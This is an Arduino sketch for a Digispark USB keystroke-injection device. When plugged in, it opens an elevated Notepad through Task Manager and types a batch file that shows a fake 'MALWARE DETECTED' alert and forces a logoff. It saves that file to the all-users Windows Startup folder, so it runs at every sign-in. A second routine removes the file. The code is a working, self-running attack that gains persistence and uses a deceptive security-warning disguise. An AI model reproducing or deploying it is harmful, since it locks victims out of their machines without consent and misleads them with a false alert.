#include <DigiKeyboard.h>

const int buttonPin = 2;
const int ledPin = 1;
int buttonState = 0;
int ledState = 0;
int last = 0;
int loops;
bool pressing = false;
bool launched = false;

void setup() {
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW);
  pinMode(buttonPin, INPUT_PULLUP);
  DigiKeyboard.sendKeyStroke(0);
  blink(1);
  launch(1);
} 

void launch(int scriptSel) {
  if (scriptSel == 1) {
    // install
    DigiKeyboard.sendKeyStroke(KEY_ESC, KEY_MOD_LSHIFT | KEY_MOD_LCTRL);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_F, KEY_MOD_LALT);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_N);
    DigiKeyboard.delay(2000);
    DigiKeyboard.write("notepad");
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("title Early Malware Detection");
    DigiKeyboard.println("@echo off");
    DigiKeyboard.println("color 47");
    DigiKeyboard.println("cls");
    DigiKeyboard.println("echo MALWARE DETECTED...");
    DigiKeyboard.println("shutdown /l");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_S, KEY_MOD_LSHIFT | KEY_MOD_LCTRL);
    DigiKeyboard.delay(300);
    DigiKeyboard.write("system.bat");
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_DOWN);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_DOWN);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_DOWN);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_UP);
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_UP);
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_UP);
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    DigiKeyboard.delay(200);
    DigiKeyboard.println("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_S, KEY_MOD_LALT);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_F4, KEY_MOD_LALT);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_F4, KEY_MOD_LALT);
    blink(3);
  }
  if (scriptSel == 2) {
    // uninstall
    DigiKeyboard.sendKeyStroke(KEY_ESC, KEY_MOD_LSHIFT | KEY_MOD_LCTRL);
    DigiKeyboard.delay(3000);
    DigiKeyboard.sendKeyStroke(KEY_F, KEY_MOD_LALT);
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_N);
    DigiKeyboard.delay(2000);
    DigiKeyboard.write("powershell  -c \"del \\\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\system.bat\\\";taskkill /F /IM TaskMgr.exe;\"");
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(300);
    blink(3);
  }
}

void blink(int count) {
  for (loops = 0; loops < count; loops++) {
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
    delay(100);
  }
  loops = 0;
}
void loop() {
}